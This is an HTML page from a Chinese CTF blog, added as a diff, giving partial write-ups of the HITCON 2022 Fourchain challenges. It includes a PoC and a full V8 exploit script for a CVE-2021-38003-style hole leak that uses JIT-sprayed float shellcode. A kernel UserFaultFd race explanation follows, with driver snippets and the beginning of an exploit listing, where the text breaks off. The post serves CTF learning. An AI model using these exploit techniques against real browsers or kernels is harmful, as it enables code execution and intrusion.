@@ -1,0 +1,671 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/Nightu.png">
+  <link rel="icon" href="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/Nightu.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Nightu">
+  <meta name="keywords" content="Nightu CTF pwn">
+  
+    <meta name="description" content="这位更是重量级 -&gt;（手指向 VitrualBox）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hitcon2022 部分题解">
+<meta property="og:url" content="http://n1ghtu.github.io/posts/a60d8e49.html">
+<meta property="og:site_name" content="Nightu">
+<meta property="og:description" content="这位更是重量级 -&gt;（手指向 VitrualBox）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202212132315557.png">
+<meta property="article:published_time" content="2022-11-29T14:12:45.000Z">
+<meta property="article:modified_time" content="2022-12-13T15:16:17.262Z">
+<meta property="article:author" content="Nightu">
+<meta property="article:tag" content="Nightu CTF pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202212132315557.png">
+  
+  
+  
+  <title>Hitcon2022 部分题解 - Nightu</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"n1ghtu.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":120,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Nightu&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202212132315557.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Hitcon2022 部分题解"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-29 22:12" pubdate>
+          2022年11月29日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          108 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Hitcon2022 部分题解</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>准备学习复现一下 Browser 和 Kernel 的部分，当然 Mojo 目前虽然会打了还是不知道原理 qwq，后面再写。</p>
+<p>其他出题人/选手的 wp：</p>
+<p>Browser: <a target="_blank" rel="noopener" href="https://bruce30262.github.io/hitcon-ctf-2022-fourchain-browser/">https://bruce30262.github.io/hitcon-ctf-2022-fourchain-browser/</a></p>
+<p>Hypervisor: <a target="_blank" rel="noopener" href="https://bruce30262.github.io/hitcon-ctf-2022-fourchain-hypervisor/">https://bruce30262.github.io/hitcon-ctf-2022-fourchain-hypervisor/</a></p>
+<p>Fourchain - Hole <a target="_blank" rel="noopener" href="https://chovid99.github.io/posts/hitcon-ctf-2022/">https://chovid99.github.io/posts/hitcon-ctf-2022/</a></p>
+<p>Eaas <a target="_blank" rel="noopener" href="https://github.com/lys0829/My-CTF-Challenges/tree/master/HITCONCTF-2022">https://github.com/lys0829/My-CTF-Challenges/tree/master/HITCONCTF-2022</a></p>
+<p>wtfshell <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-275376.htm">https://bbs.pediy.com/thread-275376.htm</a></p>
+<h2 id="⛓️-Fourchain-Hole"><a class="header-anchor" href="#⛓️-Fourchain-Hole">¶</a>⛓️ Fourchain - Hole</h2>
+<p>简单的 V8 题，是我比赛的时候唯一做出来的题 不好意思有点菜orz，最后也是被打成了签到题。不复习了熬大夜抄 2019 师傅的<a target="_blank" rel="noopener" href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html">作业</a>才抢到的三血╰（‵□′）╯。</p>
+<p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202212011731875.png" srcset="/img/loading.gif" lazyload alt="image-20221130175626313"></p>
+<p>原 <strong>CVE-2021-38003</strong> POC 和 EXP 思路</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1263462">https://bugs.chromium.org/p/chromium/issues/detail?id=1263462</a></li>
+<li><a target="_blank" rel="noopener" href="https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078">https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078</a></li>
+<li><a target="_blank" rel="noopener" href="https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/">https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/</a></li>
+</ul>
+<p>v8 “堆沙盒“ 介绍和绕过</p>
+<ul>
+<li>
+<p><a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit">https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html">https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/">https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/</a></p>
+</li>
+</ul>
+<p>直接一提的是，修改全局变量的那个思路现在已经不行了（<a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/3845636">这个patch</a>），只能参考 2019 师傅的 <code>JIT SPRAY</code> 思路了。</p>
+<h3 id="POC"><a class="header-anchor" href="#POC">¶</a>POC</h3>
+<p>获取 length 为 -1 的 map</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = [];<br><span class="hljs-keyword">var</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br>map.<span class="hljs-title function_">set</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>map.<span class="hljs-title function_">set</span>(a.<span class="hljs-title function_">hole</span>(),<span class="hljs-number">1</span>);<br><br>map.<span class="hljs-title function_">delete</span>(a.<span class="hljs-title function_">hole</span>());<br>map.<span class="hljs-title function_">delete</span>(a.<span class="hljs-title function_">hole</span>());<br>map.<span class="hljs-title function_">delete</span>(<span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-property">size</span>);<br><br>%<span class="hljs-title class_">DebugPrint</span>(map);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure>
+<h3 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br> <br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">f</span>)<br>&#123;<br>  f64[<span class="hljs-number">0</span>] = f;<br>  <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">i</span>)<br>&#123;<br>  bigUint64[<span class="hljs-number">0</span>] = i;<br>  <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoh</span>(<span class="hljs-params">f</span>)<br>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">itoh</span>(<span class="hljs-title function_">ftoi</span>(f));<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itoh</span>(<span class="hljs-params">i</span>)&#123;<br>  <span class="hljs-keyword">var</span> pad = <span class="hljs-number">16</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">BigInt</span>(i) &gt;&gt; <span class="hljs-number">32n</span> == <span class="hljs-number">0</span>)&#123;<br>    pad = <span class="hljs-number">8</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span>+i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(pad, <span class="hljs-string">&quot;0&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">lgf</span>(<span class="hljs-params">label, val</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(label + <span class="hljs-string">&quot;: 0x&quot;</span> + val.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">foo</span> = (<span class="hljs-params"></span>)=&gt;<br>&#123;<br>	<span class="hljs-keyword">return</span> [<br>        <span class="hljs-number">1.0</span>,<br>		<span class="hljs-number">1.95538254221075331056310651818E-246</span>,<br>		<span class="hljs-number">1.95606125582421466942709801013E-246</span>,<br>		<span class="hljs-number">1.99957147195425773436923756715E-246</span>,<br>		<span class="hljs-number">1.95337673326740932133292175341E-246</span>,<br>		<span class="hljs-number">2.63486047652296056448306022844E-284</span>];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10000</span>; i++) &#123;<br>	<span class="hljs-title function_">foo</span>();<span class="hljs-title function_">foo</span>();<span class="hljs-title function_">foo</span>();<span class="hljs-title function_">foo</span>();<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">f</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-number">123</span>;<br><span class="hljs-comment">// new ArrayBuffer(0x7fe00000);</span><br><span class="hljs-keyword">var</span> a = [];<br><span class="hljs-keyword">var</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><span class="hljs-keyword">var</span> foo_arr = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">var</span> obj_arr = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">var</span> f_arr = <span class="hljs-literal">null</span>;<br><br>map.<span class="hljs-title function_">set</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>map.<span class="hljs-title function_">set</span>(a.<span class="hljs-title function_">hole</span>(),<span class="hljs-number">1</span>);<br>map.<span class="hljs-title function_">delete</span>(a.<span class="hljs-title function_">hole</span>());<br>map.<span class="hljs-title function_">delete</span>(a.<span class="hljs-title function_">hole</span>());<br>map.<span class="hljs-title function_">delete</span>(<span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-property">size</span>);<br>foo_arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1.1</span>, <span class="hljs-number">1.1</span>);<span class="hljs-comment">//1.1=3ff199999999999a </span><br><span class="hljs-keyword">const</span> o = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">0x1337</span>, <span class="hljs-attr">a</span>:foo, <span class="hljs-attr">b</span>:f&#125;;<br><span class="hljs-keyword">const</span> ua = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(<span class="hljs-number">2</span>);<br>ua[<span class="hljs-number">0</span>]=<span class="hljs-number">0x23332333</span>;<br><span class="hljs-comment">//%DebugPrint(map);</span><br><span class="hljs-comment">//%DebugPrint(foo_arr);</span><br><span class="hljs-comment">//%SystemBreak();</span><br>map.<span class="hljs-title function_">set</span>(<span class="hljs-number">0x10</span>, -<span class="hljs-number">1</span>);<br>map.<span class="hljs-title function_">set</span>(foo_arr, <span class="hljs-number">0xffff</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">readOff</span>(<span class="hljs-params">off</span>)<br>&#123;<br>	foo_arr[<span class="hljs-number">0x28</span>] = <span class="hljs-title function_">itof</span>(off+<span class="hljs-number">16n</span>);<br>	<span class="hljs-keyword">return</span> ua[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">writeOff</span>(<span class="hljs-params">off, val</span>)<br>&#123;<br>	foo_arr[<span class="hljs-number">0x28</span>] = <span class="hljs-title function_">itof</span>(off+<span class="hljs-number">16n</span>);<br>	ua[<span class="hljs-number">0</span>] = val;<br>&#125;<br><span class="hljs-keyword">var</span> off_foo = <span class="hljs-title function_">ftoi</span>(foo_arr[<span class="hljs-number">7</span>])&amp;<span class="hljs-number">0xffffffffn</span>;<br><span class="hljs-keyword">var</span> off_foo_code = <span class="hljs-title function_">readOff</span>(off_foo);<br><span class="hljs-keyword">var</span> jit_off = <span class="hljs-title function_">readOff</span>(<span class="hljs-title class_">BigInt</span>(off_foo_code)-<span class="hljs-number">0x10n</span>+<span class="hljs-number">4n</span>);<br><br><span class="hljs-title function_">lgf</span>(<span class="hljs-string">&quot;off_foo&quot;</span>,off_foo);<br><span class="hljs-title function_">lgf</span>(<span class="hljs-string">&quot;off_foo_code&quot;</span>,off_foo_code);<br><span class="hljs-title function_">lgf</span>(<span class="hljs-string">&quot;jit_off&quot;</span>,jit_off);<br><br><span class="hljs-comment">//%DebugPrint(foo);</span><br><br><span class="hljs-comment">//%SystemBreak();</span><br><span class="hljs-title function_">writeOff</span>(<span class="hljs-title class_">BigInt</span>(off_foo_code)-<span class="hljs-number">0x10n</span>+<span class="hljs-number">4n</span>,jit_off+<span class="hljs-number">0x7c</span>);<br><span class="hljs-comment">//%SystemBreak();</span><br><span class="hljs-title function_">foo</span>();<br><span class="hljs-comment">//%SystemBreak();</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202211301825317.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h2 id="⛓️-Fourchain-Sandbox"><a class="header-anchor" href="#⛓️-Fourchain-Sandbox">¶</a>⛓️ Fourchain - Sandbox</h2>
+<p>第一次接触 Mojo 题，看到代码比较简单就硬钢了，结果不出意外是没做出来 orz。</p>
+<p>现在已经会打了 =。= 等补点基础再写.jpg</p>
+<h2 id="⛓️-Fourchain-Kernel"><a class="header-anchor" href="#⛓️-Fourchain-Kernel">¶</a>⛓️ Fourchain - Kernel</h2>
+<p>早知道先看 Kernel 了，难度不高 &lt;( ￣^￣)</p>
+<h3 id="解法一（Hijack-node-to-AAR-AAW）"><a class="header-anchor" href="#解法一（Hijack-node-to-AAR-AAW）">¶</a>解法一（Hijack node to AAR/AAW）</h3>
+<p>参考 <a target="_blank" rel="noopener" href="https://twitter.com/ptrYudai">ptr-yudai</a> 师傅在 Discord 服务器上发的 Exp 进行复现。</p>
+<p>这题下面的解法是<strong>非预期</strong>（ 出题人赛后说不该把Node放堆上 XD），直接日 <code>struct node</code> 达到任意读/写了，理解 UserFaultFd 后，手法其实就和我们用户态的差不多。</p>
+<p>在 <code>IO_ADD</code> 分支我们分配了 <code>sizeof(struct node)</code> 大小的 node 结构体，然后分配一个用户可控大小的 <code>data</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">table</span>[0<span class="hljs-title">x10</span>];</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>	<span class="hljs-type">uint64_t</span> key;<br>	<span class="hljs-type">uint64_t</span> size;<br>	<span class="hljs-type">char</span>* addr;<br>&#125;;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> IO_ADD:<br>		table[data.idx] = (<span class="hljs-keyword">struct</span> node*)kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> node),GFP_KERNEL);<br>		table[data.idx]-&gt;size = data.size;<br>		get_random_bytes(&amp;table[data.idx]-&gt;key,<span class="hljs-keyword">sizeof</span>(table[data.idx]-&gt;key));<br>		addr = (<span class="hljs-type">uint64_t</span>)kzalloc(data.size,GFP_KERNEL);<br>	&#125;<br></code></pre></td></tr></table></figure>
+<p>在 <code>IO_DEL</code> 分支依次 free 掉 <code>data</code> 和 <code>node</code> 结构体。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> IO_DEL:<br>	&#123;<br>		<span class="hljs-keyword">if</span>( table[data.idx] )&#123;<br>			addr = table[data.idx]-&gt;addr ^ table[data.idx]-&gt;key;<br>			kfree((<span class="hljs-type">void</span>*)addr);<br>			kfree(table[data.idx]);<br>			table[data.idx] = <span class="hljs-number">0</span>;<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>所以我们只需要控制第一次的 data 大小也是 <code>sizeof(struct node)</code> ，用 <code>UserFaultfd</code> 在 copy_from_user 这里卡住。</p>
+</li>
+<li>
+<p>随后控制 data 的大小与 <code>sizeof(struct node)</code> 不同，在缺页处理的进程里面执行一次 <code>IO_DEL</code>，俩次 <code>IO_ADD</code> 就能达到<strong>使 UserFaultfd 将要修改的 data 分配为一个另一个 table[idx] 的 node 结构体</strong>的效果。</p>
+</li>
+<li>
+<p>最后唤醒进程继续执行 <code>copy_from_user</code> 和 <code>memcpy</code> 伪造 node 结构体进行 ARR/ARW。</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">kfree((<span class="hljs-type">void</span>*)addr_idx0);<br>kfree(table[data_idx0]);<br>           	table[data.idx] = (<span class="hljs-keyword">struct</span> node*)kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> node),GFP_KERNEL);<br>addr = (<span class="hljs-type">uint64_t</span>)kzalloc(data.size,GFP_KERNEL);<br>           	table[data.idx] = (<span class="hljs-keyword">struct</span> node*)kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> node),GFP_KERNEL);<br>addr = (<span class="hljs-type">uint64_t</span>)kzalloc(data.size,GFP_KERNEL);<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> IO_EDIT:<br>	&#123;<br>		<span class="hljs-keyword">if</span>( table[data.idx] )&#123;<br>			addr = table[data.idx]-&gt;addr ^ table[data.idx]-&gt;key;<br>			size = table[data.idx]-&gt;size &amp; <span class="hljs-number">0x1ff</span>;<br>                  <span class="hljs-comment">// UserFaultfd HERE!</span><br>			ret = copy_from_user(buf, (<span class="hljs-type">void</span> __user *)data.addr, size);<br>			<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i*<span class="hljs-number">8</span> &lt; size; i++)<br>				buf[i]^= table[data.idx]-&gt;key;<br>			<span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)addr,buf,size);<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
+<p>今天吃饱着撑着了👦🏻，给大伙画个图嗷：</p>
+<p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202212080129732.png" srcset="/img/loading.gif" lazyload alt="hitcon-kernel"></p>
+<p>Exp 加了点注释 orz：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 